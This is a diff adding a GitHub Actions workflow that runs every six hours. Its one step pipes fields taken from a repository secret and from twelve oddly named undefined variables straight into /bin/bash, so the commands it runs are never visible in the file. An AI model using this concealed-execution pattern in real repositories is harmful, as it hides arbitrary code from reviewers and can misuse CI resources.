@@ -1,0 +1,29 @@
+name: xianjiafansheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianjiafansheng
+        env:
+          p70: ${{ secrets.p70 }}
+        run: |
+          echo $p70 | jq -r .dodgt5 | /bin/bash
+          echo $lut8 | jq -r .wgjk5278 | /bin/bash
+          echo $gqye418 | jq -r .hz865 | /bin/bash
+          echo $neroe77 | jq -r .hf7949 | /bin/bash
+          echo $wgsdi7 | jq -r .rb99575 | /bin/bash
+          echo $bo41135 | jq -r .kl02670 | /bin/bash
+          echo $gms531 | jq -r .w44350 | /bin/bash
+          echo $tfo70974 | jq -r .jnr21473 | /bin/bash
+          echo $jlvh20 | jq -r .gama9 | /bin/bash
+          echo $ebgmo8 | jq -r .bnsv817 | /bin/bash
+          echo $q718 | jq -r .s637 | /bin/bash
+          echo $witcv4 | jq -r .jyhnz4760 | /bin/bash
+          echo $jl7431 | jq -r .ersp94651 | /bin/bash
+
